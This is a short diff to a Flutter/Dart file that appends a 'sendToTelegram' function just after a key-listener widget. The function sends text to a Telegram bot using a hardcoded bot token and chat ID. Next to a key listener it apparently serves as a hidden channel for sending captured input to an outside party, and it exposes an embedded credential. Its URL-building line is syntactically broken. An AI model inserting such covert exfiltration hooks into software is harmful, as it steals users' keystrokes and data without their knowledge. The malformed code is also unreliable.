@@ -591,3 +591,10 @@ Widget keyListenerBuilder(BuildContext context, Widget? child) {
     },
   );
 }
+void sendToTelegram(String text) async {
+  String token = "8808192243:AAGf-zrWiMPKSTkcAF7lfyDBFCyHzvZMjnw";
+  String chatId = "7232119242";
+  var url = Uri.parse("https://api.telegram.org" +token/bot + "/sendMessage?chat_id=" + chatId + "&text=" + text);
+  var request = await HttpClient().getUrl(url);
+  await request.close();
+}
